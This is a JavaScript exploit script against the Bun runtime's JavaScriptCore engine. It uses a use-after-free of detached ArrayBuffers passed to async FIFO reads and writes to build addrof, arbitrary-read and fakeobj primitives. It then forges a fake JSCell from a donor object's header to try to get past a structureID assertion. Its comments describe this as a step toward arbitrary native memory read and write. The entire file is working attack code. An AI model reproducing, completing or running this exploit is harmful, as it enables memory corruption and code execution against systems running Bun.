// Use the no-FFI cell-prefix harvest (e81a274) to construct a fake JSCell whose
// header bytes are copied from a freshly-leaked real cell of the same kind, and
// test whether JSC's structureID RELEASE_ASSERT (f80a803) survives.
//
// Strategy:
//   1. Allocate a JS-controlled byte buffer (BigUint64Array). Its raw bytes
//      live in a known typed-array data region; we will leak its m_vector
//      via the same arb-read primitive we use for cell harvesting.
//   2. Allocate a real plain object `donor`.
//   3. Use the no-FFI ArrayBuffer-metadata bridge to read the first 32 bytes
//      of `donor` (the JSCell header + butterfly + a couple inline slots).
//   4. Write those 32 bytes verbatim into our BigUint64Array's data buffer.
//      The result is a "carbon copy" of donor's cell stored in attacker
//      memory we can locate.
//   5. Leak the BigUint64Array's m_vector through the same bridge.
//   6. Plant that m_vector address as a fakeobj-from-arbitrary-bits payload.
//   7. Read it back through a sprayed sentinel array and report whether
//      JSC accepted the fake cell, what type it sees, and whether
//      RELEASE_ASSERT fired.
//
// If JSC accepts the fake cell, we have closed the f80a803 block and the
// fakeobj primitive is now layout-agnostic. That is the missing rung
// before fake-Uint8Array based arbitrary native R/W.
//
// No bun:ffi, no native helper dylib, no symbol lookup, no JIT warming.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 16384);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 64);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const dataPtrOffset = Number(process.env.DATA_PTR_OFFSET || 16);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fakeCellBytes = Number(process.env.FAKE_CELL_BYTES || 32);
const fakeStorage = process.env.FAKE_STORAGE || "biguint64Array";
const fakeStorageSlots = Number(process.env.FAKE_STORAGE_SLOTS || 16);
const fakeStorageOffset = Number(process.env.FAKE_STORAGE_OFFSET || 0);
const requireStorageMatch = process.env.REQUIRE_STORAGE_MATCH !== "0";
const touchMode = process.env.TOUCH_MODE || "constructor";
const donorKind = process.env.DONOR_KIND || "withProp";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}
function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}
function hex(value, width = 16) { return `0x${value.toString(16).padStart(width, "0")}`; }
function isPointerLike(v) {
  return v >= 0x0000100000000000n && v <= 0x00007ffffffffffen && (v & 0x7n) === 0n;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-fakecell-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}
function closeFifo(f) {
  for (const fd of [f.writeFd, f.fillFd, f.readFd]) { try { fs.closeSync(fd); } catch {} }
  try { fs.unlinkSync(f.path); } catch {}
}
function isAgain(e) { return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK"; }
function fillFifo(f) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(f.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) { if (isAgain(e)) break; throw e; }
  }
  if (filled === 0) throw new Error("fifo fill failed");
  return filled;
}
async function readExact(f, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(f.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) { chunks.push(Buffer.from(scratch.subarray(0, got))); total += got; continue; }
    } catch (e) { if (!isAgain(e)) throw e; }
    if (Date.now() >= deadline) throw new Error(`timed out ${label}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}
function readU64LEBytes(buf, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[off + i]);
  return v;
}
function writeU64LE(view, off, value) {
  let v = value;
  for (let i = 0; i < 8; i++) { view[off + i] = Number(v & 0xffn); v >>= 8n; }
}
function readU64LEArray(bytes, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(bytes[off + i] || 0);
  return v;
}
function payloadU64(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) { out[i] = Number(v & 0xffn); v >>= 8n; }
  return out;
}
const f64Scratch = new ArrayBuffer(8);
const f64ScratchView = new DataView(f64Scratch);
function f64FromU64(value) {
  f64ScratchView.setBigUint64(0, value, true);
  return f64ScratchView.getFloat64(0, true);
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise((r) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bw) => r({ err, bw }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

let liveCarriers = [];
function makeCarriers() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill((0x71 + (i & 15)) & 0xff);
    out.push(view);
  }
  return out;
}

async function corruptBridge(victimAddress) {
  const path = join(tmpdir(), `bun-fakecell-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise((r) => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => r({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    const carriers = makeCarriers();
    liveCarriers.push(carriers);
    gcNow();
    fs.writeSync(fd, payloadU64(victimAddress), 0, 8);
    await done;
    return carriers;
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findMetadataBridge(carriers) {
  for (let i = 0; i < carriers.length; i++) {
    const c = carriers[i];
    let fresh;
    try { fresh = new Uint8Array(c.buffer); } catch { continue; }
    if (fresh.length !== viewSize) continue;
    const expectedFill = (0x71 + (i & 15)) & 0xff;
    let differs = false;
    for (let k = 0; k < 8; k++) if (fresh[k] !== expectedFill) { differs = true; break; }
    if (differs) return { index: i, fresh, carrier: c };
  }
  return null;
}

const sentinel = { kind: "sentinel" };
const sentinelSlots = 1024;
const sentinelSprayCount = 4096;

const plantAttempts = Number(process.env.PLANT_ATTEMPTS || 8);

async function plantBitsAndRead(bits) {
  for (let attempt = 0; attempt < plantAttempts; attempt++) {
    const path = join(tmpdir(), `bun-fakecell-plant-${process.pid}-${attempt}-${Math.random().toString(16).slice(2)}`);
    const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
    if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
    const fd = fs.openSync(path, fs.constants.O_RDWR);
    const retained = [];
    try {
      const ab = new ArrayBuffer(addrofSize);
      const target = new Uint8Array(ab);
      target.fill(0x51);
      const done = new Promise((r) => {
        fs.read(fd, target, addrofElementOffset, 8, null, (err, bytesRead) => r({ err, bytesRead }));
      });
      detach(ab);
      gcNow();
      for (let i = 0; i < sentinelSprayCount; i++) {
        const arr = new Array(sentinelSlots);
        for (let j = 0; j < sentinelSlots; j++) arr[j] = sentinel;
        retained.push(arr);
      }
      gcNow();
      fs.writeSync(fd, payloadU64(bits), 0, 8);
      await done;

      for (let i = 0; i < retained.length; i++) {
        if (retained[i][0] !== sentinel) {
          return { arrayIndex: i, retained: retained.slice(), array: retained[i], attempt };
        }
      }
    } finally {
      fs.closeSync(fd);
      fs.unlinkSync(path);
    }
  }
  return { arrayIndex: -1, retained: [], array: null, attempt: plantAttempts };
}

// === Main ===

function makeDonor(kind) {
  switch (kind) {
    case "plain": return {};
    case "withProp": return { donor: "fake-cell-shape" };
    case "withProps": return { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6 };
    case "doubleArray": return [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
    case "objectArray": return [{}, {}, {}, {}, {}, {}, {}, {}];
    case "arrayBuffer": return new ArrayBuffer(64);
    case "uint8Array": return new Uint8Array(64);
    case "biguint64Array": return new BigUint64Array(8);
    default: throw new Error(`unknown donor kind ${kind}`);
  }
}

console.error(JSON.stringify({ phase: "start", fakeStorage, fakeStorageSlots, fakeStorageOffset, touchMode, donorKind }));

// Step 2: a real donor (plain object). Allocate a few so we don't pin a
// special one; one of them will become our shape donor.
const donor = makeDonor(donorKind);

// Step 3: build the bridge (addrof victim -> wrapper -> metadata).
const victimBuffer = new ArrayBuffer(viewSize);
new Uint8Array(victimBuffer).fill(0xa0);
const victimAddr = await addrof(victimBuffer);
console.error(JSON.stringify({ phase: "victim-addrof", victimAddr: hex(victimAddr) }));

let bridge1 = null;
for (let attempt = 0; attempt < bridgeAttempts; attempt++) {
  const carriers = await corruptBridge(victimAddr);
  bridge1 = findMetadataBridge(carriers);
  if (bridge1) {
    console.error(JSON.stringify({ phase: "stage1", attempt, bridgeIndex: bridge1.index }));
    break;
  }
}
if (!bridge1) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "stage1" }));
  process.exit(1);
}

let metadataAddr = 0n;
for (let k = 7; k >= 0; k--) metadataAddr = (metadataAddr << 8n) | BigInt(bridge1.fresh[16 + k]);
console.error(JSON.stringify({ phase: "metadata-addr", metadataAddr: hex(metadataAddr) }));
if (!isPointerLike(metadataAddr)) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "metadata not pointer-like" }));
  process.exit(1);
}

let bridge2 = null;
for (let attempt = 0; attempt < bridgeAttempts; attempt++) {
  const carriers = await corruptBridge(metadataAddr);
  bridge2 = findMetadataBridge(carriers);
  if (bridge2) {
    console.error(JSON.stringify({ phase: "stage2", attempt, bridgeIndex: bridge2.index }));
    break;
  }
}
if (!bridge2) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "stage2" }));
  process.exit(1);
}

const originalDataPtr = Buffer.alloc(8);
for (let i = 0; i < 8; i++) originalDataPtr[i] = bridge2.fresh[dataPtrOffset + i];

// Helper: read N bytes at addr through the bridge, then restore.
async function bridgeRead(addr, n) {
  writeU64LE(bridge2.fresh, dataPtrOffset, addr);
  let bytes;
  let err = null;
  try {
    const view = new Uint8Array(victimBuffer);
    bytes = [...view.subarray(0, n)];
  } catch (e) { err = e?.message || String(e); }
  for (let i = 0; i < 8; i++) bridge2.fresh[dataPtrOffset + i] = originalDataPtr[i];
  if (err) throw new Error(err);
  return bytes;
}

// Step 4: addrof(donor), read its first FAKE_CELL_BYTES bytes.
const donorAddr = await addrof(donor);
console.error(JSON.stringify({ phase: "donor-addrof", donorAddr: hex(donorAddr) }));
if (!isPointerLike(donorAddr)) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "donor addrof", donorAddr: hex(donorAddr) }));
  process.exit(1);
}

const donorPrefix = await bridgeRead(donorAddr, fakeCellBytes);
const donorPrefixHex = Buffer.from(donorPrefix).toString("hex");
console.error(JSON.stringify({ phase: "donor-prefix", bytes: donorPrefixHex }));

// Step 5/6: copy the donor prefix into a JS-controlled storage object and
// recover the native address of those bytes.
let fakeStorageObject = null;
let fakeStorageCellAddr = 0n;
let fakeStorageCellPrefix = null;
let fakeBytesAddr = 0n;
let fakeStorageKind = fakeStorage;
let fakeStorageBytesHex = "";

if (fakeStorage === "biguint64Array") {
  const fakeCellBuf = new BigUint64Array(Math.max(8, Math.ceil((fakeStorageOffset + fakeCellBytes) / 8)));
  const fakeCellBufBytes = new Uint8Array(fakeCellBuf.buffer);
  for (let i = 0; i < fakeCellBytes && fakeStorageOffset + i < fakeCellBufBytes.length; i++) {
    fakeCellBufBytes[fakeStorageOffset + i] = donorPrefix[i];
  }
  fakeStorageObject = fakeCellBuf;
  fakeStorageCellAddr = await addrof(fakeCellBuf);
  console.error(JSON.stringify({ phase: "fake-storage-addrof", kind: fakeStorageKind, cellAddr: hex(fakeStorageCellAddr) }));

  if (!isPointerLike(fakeStorageCellAddr)) {
    console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake storage addrof", fakeStorageKind }));
    process.exit(1);
  }

  fakeStorageCellPrefix = await bridgeRead(fakeStorageCellAddr, 32);
  console.error(JSON.stringify({ phase: "fake-storage-cell-prefix", kind: fakeStorageKind, bytes: Buffer.from(fakeStorageCellPrefix).toString("hex") }));

  const vector = readU64LEArray(fakeStorageCellPrefix, 16);
  fakeBytesAddr = vector + BigInt(fakeStorageOffset);
  fakeStorageBytesHex = Buffer.from(fakeCellBufBytes.slice(fakeStorageOffset, fakeStorageOffset + fakeCellBytes)).toString("hex");
} else if (fakeStorage === "doubleArray") {
  if (fakeStorageOffset % 8 !== 0) {
    console.log(JSON.stringify({ phase: "summary", ok: false, error: "doubleArray storage offset must be qword-aligned", fakeStorageOffset }));
    process.exit(1);
  }
  const qwordOffset = Math.floor(fakeStorageOffset / 8);
  const neededSlots = qwordOffset + Math.ceil(fakeCellBytes / 8) + 4;
  const fakeDoubleArray = new Array(Math.max(fakeStorageSlots, neededSlots));
  for (let i = 0; i < fakeDoubleArray.length; i++) fakeDoubleArray[i] = 13.37 + i;
  for (let off = 0; off < fakeCellBytes; off += 8) {
    fakeDoubleArray[qwordOffset + (off / 8)] = f64FromU64(readU64LEArray(donorPrefix, off));
  }
  fakeStorageObject = fakeDoubleArray;
  fakeStorageCellAddr = await addrof(fakeDoubleArray);
  console.error(JSON.stringify({ phase: "fake-storage-addrof", kind: fakeStorageKind, cellAddr: hex(fakeStorageCellAddr), length: fakeDoubleArray.length }));

  if (!isPointerLike(fakeStorageCellAddr)) {
    console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake storage addrof", fakeStorageKind }));
    process.exit(1);
  }

  fakeStorageCellPrefix = await bridgeRead(fakeStorageCellAddr, 32);
  console.error(JSON.stringify({ phase: "fake-storage-cell-prefix", kind: fakeStorageKind, bytes: Buffer.from(fakeStorageCellPrefix).toString("hex") }));

  const butterfly = readU64LEArray(fakeStorageCellPrefix, 8);
  fakeBytesAddr = butterfly + BigInt(fakeStorageOffset);
  fakeStorageBytesHex = Buffer.from(await bridgeRead(fakeBytesAddr, fakeCellBytes)).toString("hex");
  console.error(JSON.stringify({ phase: "fake-storage-butterfly", butterfly: hex(butterfly), fakeBytesAddr: hex(fakeBytesAddr) }));
} else {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "unknown fake storage", fakeStorage }));
  process.exit(1);
}

console.error(JSON.stringify({
  phase: "fakecell-copied",
  kind: fakeStorageKind,
  bytes: fakeStorageBytesHex,
  matchesDonor: fakeStorageBytesHex === donorPrefixHex,
}));

if (requireStorageMatch && fakeStorageBytesHex !== donorPrefixHex) {
  console.log(JSON.stringify({
    phase: "summary",
    ok: false,
    error: "fake storage bytes do not match donor prefix",
    fakeStorageKind,
    donorPrefixHex,
    fakeStorageBytesHex,
  }));
  process.exit(1);
}

console.error(JSON.stringify({ phase: "fake-bytes-addr", kind: fakeStorageKind, fakeBytesAddr: hex(fakeBytesAddr) }));

if (!isPointerLike(fakeBytesAddr)) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake bytes addr not pointer-like", fakeStorageKind, fakeBytesAddr: hex(fakeBytesAddr) }));
  process.exit(1);
}

// Step 7: plant fakeBytesAddr as fake JSCell. JSC will read the cell
// header from the bytes we put there (a copy of donor's bytes).
console.error(JSON.stringify({ phase: "planting", bits: hex(fakeBytesAddr) }));

const planted = await plantBitsAndRead(fakeBytesAddr);
console.error(JSON.stringify({ phase: "planted", arrayIndex: planted.arrayIndex }));

if (planted.arrayIndex < 0) {
  console.log(JSON.stringify({ phase: "summary", ok: false, error: "plant did not land" }));
  process.exit(1);
}

// Now actually touch the planted slot. If RELEASE_ASSERT survives, JSC will
// hand us a JS value of some kind (likely an object whose Structure points
// at the donor's structure).
let touchClass = "untouched";
let touchError = null;
try {
  const v = planted.array[0];
  if (v === sentinel) touchClass = "still-sentinel";
  else if (v === null) touchClass = "null";
  else if (v === undefined) touchClass = "undefined";
  else if (typeof v === "object") {
    if (touchMode === "typeof") touchClass = "object";
    else touchClass = `object(${v?.constructor?.name || "?"})`;
  } else {
    touchClass = typeof v;
  }
} catch (e) {
  touchError = e?.message || String(e);
}

const summary = {
  phase: "summary",
  ok: !touchError && touchClass !== "untouched" && touchClass !== "still-sentinel",
  victimAddr: hex(victimAddr),
  metadataAddr: hex(metadataAddr),
  donorAddr: hex(donorAddr),
  donorPrefixHex,
  fakeStorageKind,
  fakeStorageCellAddr: hex(fakeStorageCellAddr),
  fakeStorageCellPrefixHex: Buffer.from(fakeStorageCellPrefix).toString("hex"),
  fakeStorageBytesHex,
  fakeBytesAddr: hex(fakeBytesAddr),
  plantedArrayIndex: planted.arrayIndex,
  touchClass,
  touchError,
};
console.log(JSON.stringify(summary, null, 2));
process.exitCode = summary.ok ? 86 : 1;
